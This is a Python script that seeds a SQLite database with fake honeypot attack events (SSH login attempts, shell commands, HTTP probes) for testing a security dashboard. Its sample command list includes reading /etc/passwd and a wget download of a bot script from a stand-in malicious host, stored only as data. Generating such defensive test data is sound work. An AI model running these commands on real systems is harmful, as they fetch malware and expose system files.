#!/usr/bin/env python3
"""
Seed SQLite database with realistic fake attack data for testing.

Usage:
    python3 scripts/seed_db_attacks.py
    python3 scripts/seed_db_attacks.py --count 100

This script creates synthetic attack events and saves them directly to the SQLite database.
Useful for testing the database storage functionality without requiring Elasticsearch.
"""

import argparse
import json
import random
import sys
import os
import sqlite3
from datetime import datetime, timedelta, timezone
from pathlib import Path

# Add the webapp directory to the path
sys.path.insert(0, str(Path(__file__).parent.parent / 'webapp'))

# Set up minimal Flask environment
os.environ['FLASK_ENV'] = 'development'
os.environ['WEBAPP_DB_PATH'] = str(Path(__file__).parent.parent / 'data' / 'users.db')

# Database functions
def get_db():
    """Get a database connection."""
    db_path = Path(__file__).parent.parent / 'data' / 'users.db'
    db_path.parent.mkdir(exist_ok=True)
    conn = sqlite3.connect(str(db_path))
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    """Create users and attacks tables if they don't exist."""
    print("🔧 Initializing database...")
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            email TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            role TEXT DEFAULT 'user',
            is_active BOOLEAN DEFAULT 1,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS attacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            src_ip TEXT NOT NULL,
            honeypot_type TEXT NOT NULL,
            event_type TEXT NOT NULL,
            username TEXT,
            password TEXT,
            input TEXT,
            http_method TEXT,
            request_url TEXT,
            message TEXT,
            country_name TEXT,
            city_name TEXT,
            latitude REAL,
            longitude REAL,
            raw_data TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_attacks_timestamp ON attacks(timestamp)')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_attacks_src_ip ON attacks(src_ip)')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_attacks_honeypot ON attacks(honeypot_type)')
    cursor.execute('CREATE INDEX IF NOT EXISTS idx_attacks_event ON attacks(event_type)')
    conn.commit()
    conn.close()
    print("✅ Database initialized successfully")


def save_attack_to_db(attack_data):
    """Save attack data to SQLite database for persistence."""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        # Extract geoip data
        geoip = attack_data.get('geoip', {})
        
        cursor.execute('''
            INSERT INTO attacks (
                timestamp, src_ip, honeypot_type, event_type, username, password,
                input, http_method, request_url, message, country_name, city_name,
                latitude, longitude, raw_data
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            attack_data.get('@timestamp'),
            attack_data.get('src_ip'),
            attack_data.get('honeypot_type'),
            attack_data.get('event_type'),
            attack_data.get('username'),
            attack_data.get('password'),
            attack_data.get('input'),
            attack_data.get('http_method'),
            attack_data.get('request_url'),
            attack_data.get('message'),
            geoip.get('country_name'),
            geoip.get('city_name'),
            geoip.get('latitude'),
            geoip.get('longitude'),
            json.dumps(attack_data)  # Store full raw data as backup
        ))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"❌ Error saving attack to database: {e}")
        return False


# ---------------------------------------------------------------------------
# Realistic attacker profiles: (ip, country, city, lat, lon)
# ---------------------------------------------------------------------------
ATTACKERS = [
    # Russia
    ("185.220.101.45",  "Russia",          "Moscow",         55.7558,  37.6173),
    ("45.142.212.100",  "Russia",          "Saint Petersburg",59.9311, 30.3609),
    ("91.108.4.77",     "Russia",          "Novosibirsk",    54.9833,  82.8964),
    # China
    ("122.194.155.20",  "China",           "Beijing",        39.9042, 116.4074),
    ("218.92.0.180",    "China",           "Shanghai",       31.2304, 121.4737),
    ("61.177.172.11",   "China",           "Guangzhou",      23.1291, 113.2644),
    # United States
    ("104.16.100.52",   "United States",   "San Francisco",  37.7749,-122.4194),
    ("198.199.90.7",    "United States",   "New York",       40.7128, -74.0060),
    ("35.196.20.40",    "United States",   "Iowa",           41.8780, -93.0977),
    # Netherlands
    ("89.248.167.131",  "Netherlands",     "Amsterdam",      52.3676,   4.9041),
    # Germany
    ("178.62.208.98",   "Germany",         "Frankfurt",      50.1109,   8.6821),
]

# ---------------------------------------------------------------------------
# Realistic credentials attempted against SSH
# ---------------------------------------------------------------------------
USERNAMES = ["root", "admin", "ubuntu", "pi", "test", "user"]
PASSWORDS = ["123456", "password", "admin", "root", "1234", "qwerty"]

# ---------------------------------------------------------------------------
# Realistic shell commands
# ---------------------------------------------------------------------------
COMMANDS = [
    "uname -a", "cat /etc/passwd", "id", "whoami", "ls -la /root",
    "ps aux", "ifconfig", "wget http://malicious.example.com/bot.sh"
]

COWRIE_EVENT_TYPES = ["login_failed", "login_success", "command_exec"]
HTTP_METHODS = ["GET", "POST"]
HTTP_PATHS = ["/admin", "/wp-admin/", "/.env", "/phpmyadmin/", "/login"]


def random_timestamp(hours_back: int = 24) -> str:
    """Return a random ISO-8601 UTC timestamp within the last N hours."""
    offset = random.random() * hours_back * 3600
    ts = datetime.now(timezone.utc) - timedelta(seconds=offset)
    return ts.strftime("%Y-%m-%dT%H:%M:%S.000Z")


def build_cowrie_doc() -> dict:
    ip, country, city, lat, lon = random.choice(ATTACKERS)
    event_type = random.choice(COWRIE_EVENT_TYPES)
    doc = {
        "@timestamp":   random_timestamp(),
        "src_ip":       ip,
        "honeypot_type": "cowrie-ssh",
        "event_type":   event_type,
        "geoip": {
            "location":     {"lat": lat, "lon": lon},
            "latitude":     lat,
            "longitude":    lon,
            "country_name": country,
            "city_name":    city,
        },
    }
    if event_type in ("login_failed", "login_success"):
        doc["username"] = random.choice(USERNAMES)
        doc["password"] = random.choice(PASSWORDS)
    if event_type == "command_exec":
        doc["username"] = "root"
        doc["input"]    = random.choice(COMMANDS)
    return doc


def build_flask_doc() -> dict:
    ip, country, city, lat, lon = random.choice(ATTACKERS)
    return {
        "@timestamp":   random_timestamp(),
        "src_ip":       ip,
        "honeypot_type": "flask-http",
        "event_type":   "http_request",
        "http_method":  random.choice(HTTP_METHODS),
        "request_url":  f"http://target{random.choice(HTTP_PATHS)}",
        "geoip": {
            "location":     {"lat": lat, "lon": lon},
            "latitude":     lat,
            "longitude":    lon,
            "country_name": country,
            "city_name":    city,
        },
    }


def main():
    parser = argparse.ArgumentParser(description="Seed SQLite database with demo attack data")
    parser.add_argument("--count", type=int, default=50, help="Total documents to insert (default 50)")
    args = parser.parse_args()

    print(f"🌱 Seeding SQLite database with {args.count} attack events...")

    # Initialize database
    init_db()

    # Generate and save attack data
    saved_count = 0
    for i in range(args.count):
        if random.choice([True, False]):
            attack_data = build_cowrie_doc()
        else:
            attack_data = build_flask_doc()

        if save_attack_to_db(attack_data):
            saved_count += 1
            if (i + 1) % 10 == 0:
                print(f"  Saved {i + 1}/{args.count} attacks...")
        else:
            print(f"  Failed to save attack {i + 1}")

    print(f"✅ Successfully saved {saved_count}/{args.count} attacks to SQLite database")
    print("🎯 You can now test the dashboard with: docker compose up webapp")


if __name__ == "__main__":
    main()